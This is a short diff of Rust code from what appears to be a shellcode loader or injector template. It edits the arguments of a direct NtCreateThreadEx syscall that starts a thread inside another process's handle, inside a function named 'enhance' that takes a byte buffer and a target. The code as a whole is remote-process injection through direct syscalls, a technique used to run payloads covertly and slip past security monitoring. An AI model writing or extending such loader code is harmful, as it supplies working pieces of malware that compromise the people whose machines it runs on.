@@ -18,7 +18,9 @@ use winapi::{
 };
 use ntapi::winapi::ctypes::c_void;
 use ntapi::ntpsapi::PS_ATTRIBUTE_LIST;
+use std::mem::zeroed;
 use winapi::shared::ntdef::NULL;
+
 //use ntapi::ntpsapi::NtCreateThreadEx;
 
 {{IMPORTS}}
@@ -79,23 +81,22 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
 
         let mut thread_handle : *mut c_void = null_mut();
         let handle = process_handle as *mut c_void;
-        let mut lol1: *mut OBJECT_ATTRIBUTES = null_mut();
-        let mut lol2: *mut c_void = null_mut();
-        let mut lol3: *mut PS_ATTRIBUTE_LIST = null_mut();
+        let mut oa = zeroed::<OBJECT_ATTRIBUTES>();
+        let mut pa = zeroed::<PS_ATTRIBUTE_LIST>(); 
         
         /*let write_thread = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle,
-            MAXIMUM_ALLOWED, 
-            lol1,
+            GENERIC_ALL, 
+            &mut oa,
             handle,
-            allocstart, 
-            lol2,
+            NULL, 
+            NULL,
             0, 
             0, 
             0, 
             0, 
-            lol3
+            &mut pa
         );
         */
         let write_thread = syscall!(
